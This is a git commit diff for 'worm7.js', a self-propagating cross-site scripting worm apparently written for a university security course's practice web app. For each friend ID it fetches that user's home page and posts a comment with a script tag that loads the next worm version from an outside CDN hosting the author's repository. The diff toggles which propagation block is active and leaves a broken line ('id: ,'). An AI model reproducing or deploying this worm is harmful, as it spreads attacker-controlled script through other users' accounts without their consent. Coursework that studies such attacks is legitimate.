16173ac1c22bb0615a40fe9852acdd0275fd378c
DarkLemon27 <47903566+DarkLemon27@users.noreply.github.com>
2020-04-03 18:41:16 -0400

    Update worm7.js

--- worm7.js
+++ worm7.js
@@ -18,28 +18,25 @@ function moveitmoveit() {
     var eff = friend.responseText;
     var arr= eff.match('^[^<br]*').join().split(',');
     for( var i = 0; i < arr.length; i++){
-        /*var newhome = $.ajax({
+        var newhome = $.ajax({
             async: false,
             type: 'GET',
-            url: urlString,
+            data: { id: arr[i] },
+            url: 'http://csec380-core.csec.rit.edu:86/home.php',
             success: function(data) {
                 return data;
             }
         });
-        if (newhome.responseText.match("https://cdn.jsdelivr.net/gh/DarkLemon27/WebApp@latest/worm6.js") == null){
-            $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: arr[i],comment: '<script src="https://cdn.jsdelivr.net/gh/DarkLemon27/WebApp@latest/worm6.js"></script><img src="https://img.buzzfeed.com/buzzfeed-static/static/2019-11/19/20/asset/be34feec736a/sub-buzz-4628-1574196545-1.png" width=300 height=300 />'});
-        }
-        */
-        var newhome = $.get("http://csec380-core.csec.rit.edu:86/home.php",{id: arr[i]}, function(data){ 
+        /*var newhome = $.get("http://csec380-core.csec.rit.edu:86/home.php",{id: arr[i]}, function(data){ 
             if (JSON.stringify(data).match('DarkLemon27') == null){   
                 alert("Not here");
                 $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{
-                    id: arr[i],
-                    comment: '<script src="https://cdn.jsdelivr.net/gh/DarkLemon27/WebApp@latest/worm7.js"></script><img src="https://img.buzzfeed.com/buzzfeed-static/static/2019-11/19/20/asset/be34feec736a/sub-buzz-4628-1574196545-1.png" width=300 height=300 />'
+                    id: ,
+                    comment: '<script src="https://cdn.jsdelivr.net/gh/DarkLemon27/WebApp/worm8.js"></script><img src="https://img.buzzfeed.com/buzzfeed-static/static/2019-11/19/20/asset/be34feec736a/sub-buzz-4628-1574196545-1.png" width=300 height=300 />'
                 });
             }
             return data; 
-        });
+        });*/
         
     }
     if(eff.match('159') == null){
